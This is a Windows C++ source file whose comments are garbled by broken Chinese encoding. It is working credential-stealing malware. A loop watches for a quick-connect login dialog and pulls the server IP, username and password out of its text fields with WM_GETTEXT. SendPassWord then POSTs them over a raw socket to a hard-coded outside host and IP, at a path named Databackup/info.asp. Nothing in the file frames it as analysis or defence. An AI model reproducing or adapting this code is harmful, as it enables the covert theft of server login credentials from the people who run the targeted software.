// PostMessage.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
#include "http.h"


int SendPassWord(char *password)
{
	WSADATA wsaData;
    WORD sockVersion = MAKEWORD(2, 2);
	//����winsock��
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	// �����׽���
    SOCKET sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sClient == INVALID_SOCKET)
	{
		printf("socket error\n");
		return 0;
	}	
	// ��sockaddr_in�ṹ��װ��������˵�ַ��Ϣ
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	//�������Ӷ˿�
	servAddr.sin_port = htons(80);
	//��������ip
	servAddr.sin_addr.S_un.S_addr =inet_addr("61.191.55.102");
	//���ӷ�������
	if(connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr))==SOCKET_ERROR)
	{
		printf("connect error\n");
		closesocket(sClient);
		return 0;
	}
	char packet[1024];
	//�ύ��URL
	char *url="/bbs/Databackup/info.asp";
	//����������
	char *host="bukecn.com";
	//����POST���ݰ�
	HttpPostPacket(packet,url,host,password);
    //��������
	send(sClient,packet,strlen(packet),0);
	char revData[1024]={0};
	//��������
	int ret=recv(sClient,revData,1024,0);
	//�ر��׽���
	closesocket(sClient);
	WSACleanup();
	return 0;
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char PassWord[80]={0};
	char ServerIp[80]={0};
	char UserName[80]={0};
	char BackUserName[80]={0};
	//ѭ�����
	while(TRUE)
	{
		HWND hwnd;
		char ClassName[255];
		//�õ���ǰ����ھ��
		hwnd=GetForegroundWindow();
		//�õ���ǰ���������
		GetClassName(hwnd,ClassName,255);
		//�ж��Ƿ��ǿ������Ӵ���
		if(strcmp(ClassName,"TfrmQuick")==0)
		{
			char ButtonName[80]={0};
			tagPOINT lpPoint;
			//�õ���굱ǰ����
			GetCursorPos(&lpPoint);
			//�õ���ǰ�������ڴ���ľ��
			hwnd=WindowFromPoint(lpPoint);
			if(hwnd==NULL)
				continue;
			//����WM_GETTEXT��Ϣ���õ������ı�
			SendMessage(hwnd,WM_GETTEXT,80,(LPARAM)ButtonName);
			//�����ı�����Ϊ�����ӡ���˵������������Ӱ�ť����
			if(strcmp(ButtonName,"����")!=0)
				continue;
			hwnd=FindWindowEx(NULL,NULL,"TfrmQuick","��������");
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TPageControl",NULL);
			if(hwnd==NULL)
				continue;
			hwnd=FindWindowEx(hwnd,NULL,"TTabSheet","����");
			if(hwnd==NULL)
				continue;
			HWND hFirst=FindWindowEx(hwnd,NULL,"TEdit",NULL);
			if(hFirst==NULL)
				continue;
			//�õ�������IP
			SendMessage(hFirst,WM_GETTEXT,80,(LPARAM)ServerIp);
			HWND hNext=FindWindowEx(hwnd,hFirst,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//�õ�����
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)PassWord);
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			hNext=FindWindowEx(hwnd,hNext,"TEdit",NULL);
			if(hNext==NULL)
				continue;
			//�õ��û���
			SendMessage(hNext,WM_GETTEXT,80,(LPARAM)UserName);
			//����һ�εļ�¼���û����Ƚϣ���ֹ�ظ���¼
			if(strcmp(BackUserName,UserName)==0)
				continue;
			//�����û���
			strcpy(BackUserName,UserName);
			char Data[512]={0};
			//��ʽ������
			wsprintf(Data,"msg=������IP��%s  �û�����%s  ���룺%s\r\n",ServerIp,UserName,PassWord);
			//д���ļ�
			SendPassWord(Data);	
		}
		Sleep(500);
	}
	return 0;
}



